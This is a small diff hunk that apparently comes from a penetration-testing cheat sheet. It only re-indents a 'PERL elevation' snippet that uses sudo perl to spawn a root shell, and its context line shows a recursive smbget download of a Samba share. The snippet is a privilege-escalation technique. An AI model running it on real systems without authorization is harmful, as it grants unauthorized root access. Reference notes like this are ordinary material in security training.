@@ -275,6 +275,6 @@ smbget -R smb://ip/sambashare
 ### PERL elevation
 
 ```
- sudo /usr/bin/perl -e 'exec "/bin/sh"'
- ```
+sudo /usr/bin/perl -e 'exec "/bin/sh"'
+```
 
